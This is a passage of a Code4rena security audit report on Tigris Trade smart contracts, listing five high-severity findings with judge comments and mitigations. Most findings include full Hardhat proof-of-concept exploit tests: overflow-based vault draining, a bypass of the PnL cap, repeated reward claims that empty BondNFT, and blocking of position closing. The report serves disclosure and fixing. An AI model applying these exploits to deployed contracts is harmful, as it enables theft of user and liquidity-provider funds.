[H-01] Lock.sol: assets deposited with Lock.extendLock function are lost
Submitted byHollaDieWaldfee, also found bysha256yan,kaliberpoziomka8552,0xsomeone,cccz,0xbepresent,ali_shehab,Ruhum,rvierdiiev, andcsanuragjain
https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L10
https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L61-L76
https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L84-L92
https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L98-L105
Impact
TheLockcontract (https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L10) allows end-users to interact with bonds.
There are two functions that allow to lock some amount of assets. The first function isLock.lock(https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L61-L76) which creates a new bond. The second function isLock.extendLock(https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L84-L92). This function extends the lock for some_periodand / or increases the locked amount by some_amount.
The issue is that theLock.extendLockfunction does not increase the value intotalLocked[_asset]. This however is necessary becausetotalLocked[_asset]is reduced whenLock.release(https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L98-L105) is called.
Therefore only the amount of assets deposited viaLock.lockcan be released again. The amount of assets deposited usingLock.extendLockcan never be released again because reducingtotalLocked[_asset]will cause a revert due to underflow.
So the amount of assets deposited usingLock.extendLockis lost.
Proof of Concept
User A callsLock.lockto lock a certain_amount(amount1) of_assetfor a certain_period.User A calls thenLock.extendLockand increases the locked amount of the bond by some amount2User A waits until the bond has expiredUser A callsLock.release. This function calculatestotalLocked[asset] -= lockAmount;. Which will cause a revert because the value oftotalLocked[asset]is only amount1
You can add the following test to theBondstest inBonds.js:
describe("ReleaseUnderflow",function() {it("release can cause underflow",asyncfunction() {awaitstabletoken.connect(owner).mintFor(user.address,ethers.utils.parseEther("110"));// Lock 100 for 9 daysawaitlock.connect(user).lock(StableToken.address,ethers.utils.parseEther("100"),9);awaitbond.connect(owner).setManager(lock.address);awaitstabletoken.connect(user).approve(lock.address,ethers.utils.parseEther("10"));// Lock another 10awaitlock.connect(user).extendLock(1,ethers.utils.parseEther("10"),0);awaitnetwork.provider.send("evm_increaseTime", [864000]);// Skip 10 daysawaitnetwork.provider.send("evm_mine");// Try to release 110 after bond has expired -> Underflowawaitlock.connect(user).release(1);});});
Run it withnpx hardhat test --grep "release can cause underflow".You can see that it fails because it causes an underflow.
Tools Used
VS Code
Recommended Mitigation Steps
AddtotalLocked[_asset] += amountto theLock.extendLockfunction.
TriHaz (Tigris Trade) confirmed
Alex the Entreprenerd (judge) commented:
The warden has shown an issue with accounting that will cause principal deposits added viaextendLockto be lost, for this reason I agree with High Severity.
GainsGoblin (Tigris Trade) resolved:
Mitigation:https://github.com/code-423n4/2022-12-tigris/pull/2#issuecomment-1419172200

[H-02] Riskless trades due to delay check
Submitted byBobface
Trading.limitClose()uses_checkDelay(). This allows for riskless trades, by capturing price rises through increasing the stop-loss, while preventing the underwater position to be closed in case of the price dropping by continuously increasing the delay.
Detailed description
A malicious trader can exploit theTradingcontract to achieve riskless trades. In the worst-case scenario, the trader can always close the trade break-even, while in a good scenario the trader captures all upside price movement.
The exploit is based on three principles:
The stop-loss of a position can be updated without any delay checks, due to_checkDelay()not being called inupdateTpSl()Positions can only be closed by MEV bots or other third parties after the block delay has been passed due tolimitClosecalling_checkDelay()The block delay can be continuously renewed for a negligible cost
Based on these three principles, the following method can be used to perform riskless trades:Assuming a current market price of 1,000 DAI, begin by opening a long limit order throughinitiateLimitOrder()at the current market price of 1,000 DAI and stop-loss at the exact market price of 1,000 DAI. Then immediately execute the limit order throughexecuteLimitOrder.
After the block delay has passed, MEV bots or other third parties interested in receiving a percentage reward for closing the order would calllimitClose. However, we can prevent them from doing so by continuously callingaddToPositionwith 1 wei when the block delay comes close to running out[1], which will renew the delay and thus stopslimitClosefrom being called.
While the trader keeps renewing the delay to stop his position from being closed, he watches the price development:
If the price goesdown, the trader will not make any loss, since he still has his original stop-loss set. He just has to make sure that the price does not drop too far to be liquidated throughliquidatePosition(). If the price comes close to the liquidation zone, he stops renewing the delay and closes the position break-even for the initial stop-loss price even though the price is down significantly further. He can also choose to do that at any other point in time if he decides the price is unlikely to move upward again.If the price goesup, the trader callsupdateTpSl()to lock in the increased price. For example, if the price moves from 1,000 DAI to 2,000 DAI, he callsupdateTpSl()with 2,000 DAI as stop-loss. Even if the price drops below 2,000 DAI again, the stop-loss is stored. This function can be called while the delay is still in place because there is no call to_checkDelay().
The trader keeps callingupdateTpSl()when the price reaches a new high since he opened the position initially to capture all upside movement. When he decides that the price has moved high enough, he finally lets the delay run out and callslimitClose()to close the order at the peak stop-loss.
Notes[1]: Tigris Trade also plans to use L2s such as Arbitrum where there is one block per transaction. This could bring up the false impression that the trader would have to make lots of calls toaddToPositionafter every few transactions on the chain. However,block.number, which is used by the contract, actually returns the L1 block number and not the L2 block number.
Recommended Mitigation Steps
The core issue is that the position cannot be closed even if it is below the stop-loss due to constantly renewing the delay. The delay checking inlimitClose()should be modified to also consider whether the position is below the stop-loss.
Proof of Concept
Insert the following code as test intotest/07.Trading.jsand run it withnpx hardhat test test/07.Trading.js:
describe("PoC",function() {it.only("PoC",asyncfunction() {// Setup token balances and approvalsconstmockDAI=awaitethers.getContractAt("MockERC20",MockDAI.address)awaitmockDAI.connect(owner).transfer(user.address,parseEther("10000"))awaitmockDAI.connect(owner).transfer(stablevault.address,parseEther("100000"))awaitmockDAI.connect(user).approve(trading.address,parseEther("10000"))constdaiAtBeginning=awaitmockDAI.balanceOf(user.address)constpermitData= ["0","0","0","0x0000000000000000000000000000000000000000000000000000000000000000","0x0000000000000000000000000000000000000000000000000000000000000000",false]// Setup block delay to 5 blocksconstblockDelay=5;awaittrading.connect(owner).setBlockDelay(blockDelay)// ============================================================== //// =================== Create the limit order =================== //// ============================================================== //consttradeInfo= [parseEther("9000"),// margin amountMockDAI.address,// margin assetStableVault.address,// stable vaultparseEther("2"),// leverage0,// asset idtrue,// direction (long)parseEther("0"),// take profit priceparseEther("1000"),// stop loss priceethers.constants.HashZero// referral];// Create the orderawaittrading.connect(user).initiateLimitOrder(tradeInfo,// trade info1,// order type (limit)parseEther("1000"),// pricepermitData,// permituser.address// trader)// ============================================================== //// =================== Execute the limit order ================== //// ============================================================== //// Wait for some blocks to pass the delayawaitnetwork.provider.send("evm_increaseTime", [10])for(letn=0;n<blockDelay;n++) {awaitnetwork.provider.send("evm_mine")}// Create the price data (the price hasn't changed)letpriceData= [node.address,// provider0,// asset idparseEther("1000"),// price10000000,// spread (0.1%)(awaitethers.provider.getBlock()).timestamp,// timestampfalse// is closed]// Sign the price dataletmessage=ethers.utils.keccak256(ethers.utils.defaultAbiCoder.encode(['address','uint256','uint256','uint256','uint256','bool'],[priceData[0],priceData[1],priceData[2],priceData[3],priceData[4],priceData[5]]));letsig=awaitnode.signMessage(Buffer.from(message.substring(2),'hex'))// Execute the limit orderawaittrading.connect(user).executeLimitOrder(1,priceData,sig);// ============================================================== //// ================== Block bots from closing =================== //// ============================================================== //for(leti=0;i<5;i++) {/*This loop demonstrates blocking bots from closing the position even if the price falls below the stop loss.We constantly add 1 wei to the position when the delay is close to running out.This won't change anything about our position, but it will reset the delay timer,stopping bots from calling `limitClose()`.This means that if the price drops, we can keep our position open with the higher stop loss, avoiding any losses.And if the price rises, we can push the stop loss higher to keep profits.The loop runs five times just to demonstrate. In reality, this could be done as long as needed.*/// Blocks advanced to one block before the delay would passawaitnetwork.provider.send("evm_increaseTime", [10])for(letn=0;n<blockDelay-1;n++) {awaitnetwork.provider.send("evm_mine")}// ============================================================== //// =========== Add 1 wei to position (price is down)  =========== //// ============================================================== //// Increase delay by calling addToPosition with 1 wei// Create the price datapriceData= [node.address,// provider0,// asset idparseEther("900"),// price10000000,// spread (0.1%)(awaitethers.provider.getBlock()).timestamp,// timestampfalse// is closed]// Sign the price data -message=ethers.utils.keccak256(ethers.utils.defaultAbiCoder.encode(['address','uint256','uint256','uint256','uint256','bool'],[priceData[0],priceData[1],priceData[2],priceData[3],priceData[4],priceData[5]]));sig=awaitnode.signMessage(Buffer.from(message.substring(2),'hex'))// Add to positionawaittrading.connect(user).addToPosition(1,"1",priceData,sig,stablevault.address,MockDAI.address,permitData,user.address,)// ============================================================== //// ====================== Bots cannot close ===================== //// ============================================================== //// Bots cannot close the position even if the price is down below the stop lossawaitexpect(trading.connect(user).limitClose(1,// idfalse,// take profitpriceData,// price datasig,// signature)).to.be.revertedWith("0")// checkDelay// They can also not liquidate the position because the price is not down enough// If the price falls close to the liquidation zone, we can add more margin or simply close// the position, netting us the stop-loss price.awaitexpect(trading.connect(user).liquidatePosition(1,// idpriceData,// price datasig,// signature)).to.be.reverted// ============================================================== //// =============== Increase SL when price is up  ================ //// ============================================================== //// Sign the price data (price has 5x'ed from initial price)priceData= [node.address,// provider0,// asset idparseEther("5000"),// price10000000,// spread (0.1%)(awaitethers.provider.getBlock()).timestamp,// timestampfalse// is closed]message=ethers.utils.keccak256(ethers.utils.defaultAbiCoder.encode(['address','uint256','uint256','uint256','uint256','bool'],[priceData[0],priceData[1],priceData[2],priceData[3],priceData[4],priceData[5]]));sig=awaitnode.signMessage(Buffer.from(message.substring(2),'hex'))// Update stop loss right at the current priceawaittrading.connect(user).updateTpSl(false,// type (sl)1,// idparseEther("5000"),// sl pricepriceData,// price datasig,// signatureuser.address,// trader)}// ============================================================== //// ======================== Close order  ======================== //// ============================================================== //// When we are happy with the profit, we stop increasing the delay and close the position// Wait for some blocks to pass the delayawaitnetwork.provider.send("evm_increaseTime", [10])for(letn=0;n<blockDelay;n++) {awaitnetwork.provider.send("evm_mine")}// Close orderawaittrading.connect(user).limitClose(1,// idfalse,// take profitpriceData,// price datasig,// signature)// Withdraw to DAIconstamount=awaitstabletoken.balanceOf(user.address)awaitstablevault.connect(user).withdraw(MockDAI.address,amount)// Print resultsconstdaiAtEnd=awaitmockDAI.balanceOf(user.address)consttenPow18="1000000000000000000"constdiff= (daiAtEnd-daiAtBeginning).toString() /tenPow18console.log(`Profit:${diff}DAI`)})})
GainsGoblin (Tigris Trade) confirmed
Alex the Entreprenerd (judge) commented:
The warden has shown how, through the combination of: finding a way to re-trigger the delayCheck, altering SL and TP prices, a trader can prevent their position from being closed, creating the opportunity for riskless trades.Because of the broken invariants, and the value extraction shown, I agree with High Severity.
GainsGoblin (Tigris Trade) resolved:
Mitigation:https://github.com/code-423n4/2022-12-tigris/pull/2#issuecomment-1419173125

[H-03] Certain fee configuration enables vaults to be drained
Submitted byBobface
An overflow inTradingLibrary.pnl()enables all funds from the vault contracts to be drained given a certain fee configuration is present.
Detailed exploit process description
When opening a position, any value can be passed as take-profit price. This value is later used in the PNL calculation in anuncheckedblock. Setting this value specifically to attack the vault leads to theTradingcontract minting a huge (in the example below10^36) Tigris tokens, which can then be given to the vault to withdraw assets.
The exploiter starts by setting himself as referrer, in order to later receive the referrer fees.
The next step is to open a short position at the current market price by callinginitiateLimitOrder(). Here, the malicious value which will later bring the arithmetic to overflow is passed in as take-profit price. For the example below, the value has been calculated by hand to be115792089237316195423570985008687907854269984665640564039467for this specific market price, leverage and margin.
The order is then immediately executed throughexecuteLimitOrder().
The final step is to close the order throughlimitClose(), which will then mint over10^36Tigris tokens to the attacker.
Detailed bug description
The bug takes place inTradingLibrary.pnl(), line 46. The function is called during the process of closing the order to calculate the payout and position size. The malicious take-profit is passed as_currentPriceand the order’s original opening price is passed as_price. The take-profit has been specifically calculated so that1e18 * _currentPrice / _price - 1e18results in0, meaning_payout = _margin(accInterestis negligible for this PoC).
Line 48 then calculates the position size. Margin and leverage have been chosen so that_initPositionSize * _currentPricedoes not overflow, resulting in a huge_positionSizewhich is returned from the function.
Later,Trading._handleCloseFees()is called, under the condition that_payout > 0, which is why the overflow had to be calculated so precisely, as to not subtract from the_payoutbut still create a large_positionSize._positionSizeis passed in to this function, and it is used to calculate DAO and referral fees. Line 805 is what requires the specific fee configuration to be present, as otherwise this line would revert. The fees have to bedaoFees = 2*referralFees— not exactly, but close to this relationship. Then line 792 will set the DAO fees close to zero, while the hugereferralFeesare directly minted and not included in the calculation in line 805.
Recommended Mitigation Steps
The core issue is that the arithmetic inTradingLibrary.pnl()overflows. I recommend removing theuncheckedblock.
Proof of Concept
Insert the following code as test intotest/07.Trading.jsand run it withnpx hardhat test test/07.Trading.js:
describe("PoC",function() {it.only("PoC",asyncfunction() {// Setup token balances and approvalsconstmockDAI=awaitethers.getContractAt("MockERC20",MockDAI.address)awaitmockDAI.connect(owner).transfer(user.address,parseEther("10000"))awaitmockDAI.connect(user).approve(trading.address,parseEther("10000"))constpermitData= ["0","0","0","0x0000000000000000000000000000000000000000000000000000000000000000","0x0000000000000000000000000000000000000000000000000000000000000000",false]// Create referral codeawaitreferrals.connect(user).createReferralCode(ethers.constants.HashZero)// Set the feesawaittrading.connect(owner).setFees(false,// close"200000000",// dao"0",// burn"100000000",// referral"0",// bot"0",// percent)// ============================================================== //// =================== Create the limit order =================== //// ============================================================== //consttradeInfo= [parseEther("1"),// margin amountMockDAI.address,// margin assetStableVault.address,// stable vaultparseEther("2"),// leverage0,// asset idfalse,// direction (short)"115792089237316195423570985008687907854269984665640564039467",// take profit priceparseEther("0"),// stop loss priceethers.constants.HashZero// referral (ourself)];// Create the orderawaittrading.connect(user).initiateLimitOrder(tradeInfo,// trade info1,// order type (limit)parseEther("1000"),// pricepermitData,// permituser.address// trader)// ============================================================== //// =================== Execute the limit order ================== //// ============================================================== //// Wait for some blocks to pass the delayawaitnetwork.provider.send("evm_increaseTime", [10])awaitnetwork.provider.send("evm_mine")// Create the price dataletpriceData= [node.address,// provider0,// asset idparseEther("1000"),// price10000000,// spread (0.1%)(awaitethers.provider.getBlock()).timestamp,// timestampfalse// is closed]// Sign the price dataletmessage=ethers.utils.keccak256(ethers.utils.defaultAbiCoder.encode(['address','uint256','uint256','uint256','uint256','bool'],[priceData[0],priceData[1],priceData[2],priceData[3],priceData[4],priceData[5]]));letsig=awaitnode.signMessage(Buffer.from(message.substring(2),'hex'))// Execute the limit orderawaittrading.connect(user).executeLimitOrder(1,priceData,sig);// ============================================================== //// ======================== Close order  ======================== //// ============================================================== //// Wait for some blocks to pass the delayawaitnetwork.provider.send("evm_increaseTime", [10])awaitnetwork.provider.send("evm_mine")// Close orderawaittrading.connect(user).limitClose(1,// idtrue,// take profitpriceData,// price datasig,// signature)// Print resultsconstamount=awaitstabletoken.balanceOf(user.address)consttenPow18="1000000000000000000"console.log(`StableToken balance at end:${(amount/tenPow18).toString()}`)})})
TriHaz (Tigris Trade) confirmed
Alex the Entreprenerd (judge) commented:
In contrast to other reports that have some ambiguity, this report has shown a way to undercollateralize the vault and steal effectively all value.The Warden has shown how, by leveraginguncheckedmath and using injected-inputs, it’s possible to effectively mint an infinite amount of Stable Tokens.Mitigation will require ensuring that user provided inputs do not allow for overflows.
GainsGoblin (Tigris Trade) resolved:
Mitigation:https://github.com/code-423n4/2022-12-tigris/pull/2#issuecomment-1419173668

[H-04] Bypass the maximum PnL check to take extra profit
Submitted byKingNFT
To protect the fund of vault, the protocol has a security mechanism which limits:
Maximum PnL is +500%.
source:https://docs.tigris.trade/protocol/trading-and-fees#limitations
But the implementation is missing to check this limitation whileaddToPosition(), an attacker can exploit it to get more profit than expected.
Proof of Concept
The following test case shows both normal case and the exploit scenario.
In the normal case,  a 990 USD margin, gets back a 500% of 4950 USD payout, and the profit is 3960 USD.
In the exploit case, the attack will get an extra 2600+ USD profit than the normal case.
const { expect } = require("chai");const { deployments, ethers, waffle } = require("hardhat");const { parseEther, formatEther } = ethers.utils;const { signERC2612Permit } = require('eth-permit');const exp = require("constants");describe("Design Specification: Maximum PnL is +500%", function () {let owner;let node;let user;let node2;let node3;let proxy;let Trading;let trading;let TradingExtension;let tradingExtension;let TradingLibrary;let tradinglibrary;let StableToken;let stabletoken;let StableVault;let stablevault;let position;let pairscontract;let referrals;let permitSig;let permitSigUsdc;let MockDAI;let mockdai;let MockUSDC;let mockusdc;let badstablevault;let chainlink;beforeEach(async function () {await deployments.fixture(['test']);[owner, node, user, node2, node3, proxy] = await ethers.getSigners();StableToken = await deployments.get("StableToken");stabletoken = await ethers.getContractAt("StableToken", StableToken.address);Trading = await deployments.get("Trading");trading = await ethers.getContractAt("Trading", Trading.address);await trading.connect(owner).setMaxWinPercent(5e10);TradingExtension = await deployments.get("TradingExtension");tradingExtension = await ethers.getContractAt("TradingExtension", TradingExtension.address);const Position = await deployments.get("Position");position = await ethers.getContractAt("Position", Position.address);MockDAI = await deployments.get("MockDAI");mockdai = await ethers.getContractAt("MockERC20", MockDAI.address);MockUSDC = await deployments.get("MockUSDC");mockusdc = await ethers.getContractAt("MockERC20", MockUSDC.address);const PairsContract = await deployments.get("PairsContract");pairscontract = await ethers.getContractAt("PairsContract", PairsContract.address);const Referrals = await deployments.get("Referrals");referrals = await ethers.getContractAt("Referrals", Referrals.address);StableVault = await deployments.get("StableVault");stablevault = await ethers.getContractAt("StableVault", StableVault.address);await stablevault.connect(owner).listToken(MockDAI.address);await stablevault.connect(owner).listToken(MockUSDC.address);await tradingExtension.connect(owner).setAllowedMargin(StableToken.address, true);await tradingExtension.connect(owner).setMinPositionSize(StableToken.address, parseEther("1"));await tradingExtension.connect(owner).setNode(node.address, true);await tradingExtension.connect(owner).setNode(node2.address, true);await tradingExtension.connect(owner).setNode(node3.address, true);await network.provider.send("evm_setNextBlockTimestamp", [2000000000]);await network.provider.send("evm_mine");permitSig = await signERC2612Permit(owner, MockDAI.address, owner.address, Trading.address, ethers.constants.MaxUint256);permitSigUsdc = await signERC2612Permit(owner, MockUSDC.address, owner.address, Trading.address, ethers.constants.MaxUint256);const BadStableVault = await ethers.getContractFactory("BadStableVault");badstablevault = await BadStableVault.deploy(StableToken.address);const ChainlinkContract = await ethers.getContractFactory("MockChainlinkFeed");chainlink = await ChainlinkContract.deploy();TradingLibrary = await deployments.get("TradingLibrary");tradinglibrary = await ethers.getContractAt("TradingLibrary", TradingLibrary.address);await trading.connect(owner).setLimitOrderPriceRange(1e10);});describe("Bypass the maximum PnL check to take extra profit", function () {let orderId;let closePriceData;let closeSig;let initPrice = parseEther("1000");let closePrice = parseEther("2000");beforeEach(async function () {let maxWin = await trading.maxWinPercent();expect(maxWin.eq(5e10)).to.equal(true);let TradeInfo = [parseEther("1000"), MockDAI.address, StableVault.address, parseEther("10"), 1, true, parseEther("0"), parseEther("0"), ethers.constants.HashZero];let PriceData = [node.address, 1, initPrice, 0, 2000000000, false];let message = ethers.utils.keccak256(ethers.utils.defaultAbiCoder.encode(['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],[node.address, 1, initPrice, 0, 2000000000, false]));let sig = await node.signMessage(Buffer.from(message.substring(2), 'hex'));let PermitData = [permitSig.deadline, ethers.constants.MaxUint256, permitSig.v, permitSig.r, permitSig.s, true];orderId = await position.getCount();await trading.connect(owner).initiateMarketOrder(TradeInfo, PriceData, sig, PermitData, owner.address);expect(await position.assetOpenPositionsLength(1)).to.equal(1);let trade = await position.trades(orderId);let marginAfterFee = trade.margin;expect(marginAfterFee.eq(parseEther('990'))).to.equal(true);// Some time laterawait network.provider.send("evm_setNextBlockTimestamp", [2000001000]);await network.provider.send("evm_mine");// Now the price is doubled, profit = margin * leverage = $990 * 10 = $9900closePriceData = [node.address, 1, closePrice, 0, 2000001000, false];let closeMessage = ethers.utils.keccak256(ethers.utils.defaultAbiCoder.encode(['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],[node.address, 1, closePrice, 0, 2000001000, false]));closeSig = await node.signMessage(Buffer.from(closeMessage.substring(2), 'hex'));});it.only("All profit is $9900, close the order normally, only get $3960 profit", async function () {let balanceBefore = await stabletoken.balanceOf(owner.address);await trading.connect(owner).initiateCloseOrder(orderId, 1e10, closePriceData, closeSig, StableVault.address, StableToken.address, owner.address);let balanceAfter = await stabletoken.balanceOf(owner.address);let marginAfterFee = parseEther("990");let payout = balanceAfter.sub(balanceBefore);expect(payout.eq(parseEther("4950"))).to.be.true;let profit = balanceAfter.sub(balanceBefore).sub(marginAfterFee);expect(profit.eq(parseEther("3960"))).to.be.true;});it.only("All profit is $9900, bypass the PnL check to take extra $2600 profit", async function () {// We increase the possition first rather than closing the profit order directlylet PermitData = [permitSig.deadline, ethers.constants.MaxUint256, permitSig.v, permitSig.r, permitSig.s, false];let extraMargin = parseEther("1000");await trading.connect(owner).addToPosition(orderId, extraMargin, closePriceData, closeSig, StableVault.address, MockDAI.address, PermitData, owner.address);// 60 secs laterawait network.provider.send("evm_setNextBlockTimestamp", [2000001060]);await network.provider.send("evm_mine");// Now we close the order to take all profitclosePriceData = [node.address, 1, closePrice, 0, 2000001060, false];let closeMessage = ethers.utils.keccak256(ethers.utils.defaultAbiCoder.encode(['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],[node.address, 1, closePrice, 0, 2000001060, false]));closeSig = await node.signMessage(Buffer.from(closeMessage.substring(2), 'hex'));let balanceBefore = await stabletoken.balanceOf(owner.address);await trading.connect(owner).initiateCloseOrder(orderId, 1e10, closePriceData, closeSig, StableVault.address, StableToken.address, owner.address);let balanceAfter = await stabletoken.balanceOf(owner.address);let marginAfterFee = parseEther("990").add(extraMargin.mul(990).div(1000));let originalProfit = parseEther("3960");let extraProfit = balanceAfter.sub(balanceBefore).sub(marginAfterFee).sub(originalProfit);expect(extraProfit.gt(parseEther('2600'))).to.be.true;});});});
The test result
Design Specification: Maximum PnL is +500%Bypass the maximum PnL check to take extra profit√ All profit is $9900, close the order normally, only get $3960 profit√ All profit is $9900, bypass the PnL check to take extra $2600 profit
Tools Used
VS Code
Recommended Mitigation Steps
Add a check foraddToPosition()function, revert if PnL >= 500%, enforce users to close the order to take a limited profit.
TriHaz (Tigris Trade) confirmed, but disagreed with severity and commented:
It is valid but I think it should be Medium risk as it needs +500% win to happen so assets are not in a direct risk, need a judge opinion on this.
KingNFT (warden) commented:
As the max leverages are 100x for crypto pairs and 500x for forex pairs, so 5% price change on crypto pairs or 1% on forex pairs lead to 500% profit. I think it would be frequent to see +500% win happening.In my personal opinion, the500%security design is a base and important feature to protect fund safety of stakers, this bug causes the feature almost not working. Maybe it deserves a high severity.
Alex the Entreprenerd (judge) commented:
The Warden has shown how, because of a lack of checks, an attacker could bypass the PNL cap and extract more value than intended.While the condition of having a price movement of 500% can be viewed as external, I believe that in this specific case we have to exercise more nuance.An attacker could setup a contract to perform the sidestep only when favourable, meaning that while the condition may not always be met, due to volatility of pricing there always is a % (can be viewed as a poisson distribution) that a PNL bypass would favour the attacker.Additionally, after theCRV / AVI attackwe have pretty strong evidence that any +EV scenario can be exploited as long as the payout is high enough.As such I believe that the finding doesn’t truly rely on an external condition.For this reason, as well as knowing that the value extracted will be paid by LPs / the Protocol, I believe High Severity to be the most appropriate
GainsGoblin (Tigris Trade) commented:
Mitigation:https://github.com/code-423n4/2022-12-tigris/pull/2#issuecomment-1419173887Implemented something similar to this report’s recommended mitigation, where if PnL is >= maxPnl%-100%, then addToPosition, addMargin and removeMargin revert.

[H-05] Malicious user can steal all assets in BondNFT
Submitted byhihen, also found byhansfriese,unforgiven,__141345__,rvierdiiev, andHollaDieWaldfee
Malicious user can drain all assets in BondNFT, and other users will lose their rewards.
Proof of Concept
When callingBondNFT.claim()for an expired bond, it will recalculateaccRewardsPerShare. This is because the reward after theexpireEpochdoes not belong to that expired bond and needs to be redistributed to all other bonds.
if(bond.expired) {uint_pendingDelta= (bond.shares*accRewardsPerShare[bond.asset][epoch[bond.asset]] /1e18-bondPaid[_id][bond.asset]) - (bond.shares*accRewardsPerShare[bond.asset][bond.expireEpoch-1] /1e18-bondPaid[_id][bond.asset]);if(totalShares[bond.asset] >0) {accRewardsPerShare[bond.asset][epoch[bond.asset]] +=_pendingDelta*1e18/totalShares[bond.asset];}}
In the current implementation ofBondNFT.claim(), it can be called repeatedly as long as the expired bond is not released.
According to the formula in the above code, we can find that although each subsequentclaim()of the expired bond will transfer 0 reward, theaccRewardsPerSharewill be updated cumulatively.
Thus, the pending rewards of all other users will increase every time the expired bond isclaim()ed.
A malicious user can exploit this vulnerability to steal all assets in BondNFT contract:
Create two bonds (B1, B2) with differentexpireEpochAt some time after B1 has expired (B2 has not), keep callingLock.claim(B1)to increase rewards of B2 continuously, until the pending rewards of B2 approaches the total amount of asset in the contract.CallLock.claim(B2)to claim all pending rewards of B2.
An example of such an attack:
diff--gita/test/09.Bonds.jsb/test/09.Bonds.jsindex16c3ff5..7c445c3100644---a/test/09.Bonds.js+++b/test/09.Bonds.js@@ -245,7+245,90@@describe("Bonds",function() {awaitlock.connect(user).release(2);expect(awaitbond.pending(1)).to.be.equals("999999999999999999725");// Negligable difference from 1000e18 due to solidity division});++it.only("Drain BondNFT rewards",asyncfunction() {+constgetState=async()=>{+constbalHacker=awaitstabletoken.balanceOf(hacker.address);+constbalLock=awaitstabletoken.balanceOf(lock.address);+constbalBond=awaitstabletoken.balanceOf(bond.address);+const[pending1,pending2,pending3] = [awaitbond.pending(1),awaitbond.pending(2),awaitbond.pending(3)];+return{hacker:balHacker,lock:balLock,bond:balBond,pending1,pending2,pending3};+      };+constparseEther= (v)=>ethers.utils.parseEther(v.toString());+constgwei=parseEther(1).div(1e9);++// prepare tokens+constTotalRewards=parseEther(8000);+awaitstabletoken.connect(owner).mintFor(owner.address,TotalRewards);+awaitstabletoken.connect(owner).mintFor(user.address,parseEther(1000));+consthacker=rndAddress;+awaitstabletoken.connect(owner).mintFor(hacker.address,parseEther(2000+700));+awaitstabletoken.connect(hacker).approve(Lock.address,parseEther(2000));++// bond1 - user+awaitlock.connect(user).lock(StableToken.address,parseEther(1000),100);+awaitbond.distribute(stabletoken.address,parseEther(3800));+expect(awaitbond.pending(1)).to.be.closeTo(parseEther(3800),gwei);+// Skip some time+awaitnetwork.provider.send("evm_increaseTime", [20*86400]);+awaitnetwork.provider.send("evm_mine");++// bond2 - hacker+awaitlock.connect(hacker).lock(StableToken.address,parseEther(1000),10);+// bond3 - hacker+awaitlock.connect(hacker).lock(StableToken.address,parseEther(1000),100);++awaitbond.distribute(stabletoken.address,parseEther(2100));++// Skip 10+ days, bond2 is expired+awaitnetwork.provider.send("evm_increaseTime", [13*86400]);+awaitnetwork.provider.send("evm_mine");+awaitbond.distribute(stabletoken.address,parseEther(2100));++// check balances before hack+letst=awaitgetState();+expect(st.bond).to.be.equals(TotalRewards);+expect(st.lock).to.be.equals(parseEther(3000));+expect(st.hacker).to.be.equals(parseEther(0+700));+expect(st.pending1).to.be.closeTo(parseEther(3800+1000+1000),gwei);+expect(st.pending2).to.be.closeTo(parseEther(100),gwei);+expect(st.pending3).to.be.closeTo(parseEther(1000+1000),gwei);++// first claim of expired bond2+awaitlock.connect(hacker).claim(2);+st=awaitgetState();+expect(st.bond).to.be.closeTo(TotalRewards.sub(parseEther(100)),gwei);+expect(st.hacker).to.be.closeTo(parseEther(100+700),gwei);+expect(st.pending1).to.be.gt(parseEther(3800+1000+1000));+expect(st.pending2).to.be.eq(parseEther(0));+expect(st.pending3).to.be.gt(parseEther(1000+1000));++// hack+constremainReward=st.bond;+letpending3=st.pending3;+leti=0;+for(;remainReward.gt(pending3);i++) {+// claim expired bond2 repeatedly+awaitlock.connect(hacker).claim(2);+// pending3 keeps increasing+pending3=awaitbond.pending(3);+      }+console.log(`claim count:${i}\nremain:${ethers.utils.formatEther(remainReward)}\npending3:${ethers.utils.formatEther(pending3)}\n`);++// send diff, then drain rewards in bond+awaitstabletoken.connect(hacker).transfer(bond.address,pending3.sub(remainReward));+awaitlock.connect(hacker).claim(3);+st=awaitgetState();+// !! bond is drained !!+expect(st.bond).to.be.eq(0);+// !! hacker gets all rewards !!+expect(st.hacker).to.be.eq(TotalRewards.add(parseEther(700)));+expect(st.pending1).to.be.gt(parseEther(3800+1000+1000));+expect(st.pending2).to.be.eq(0);+expect(st.pending3).to.be.eq(0);+    });});+describe("Withdrawing",function() {it("Only expired bonds can be withdrawn",asyncfunction() {awaitstabletoken.connect(owner).mintFor(owner.address,ethers.utils.parseEther("100"));
Output:
BondsRewardsclaim count: 41remain: 7900.000000000000000002pending3: 8055.7342616570405578✓ Drain BondNFT rewards1 passing (4s)
Tools Used
VS Code
Recommended Mitigation Steps
I recommend that an expired bond should be forced torelease(),claim()an expired bond should revert.
Sample code:
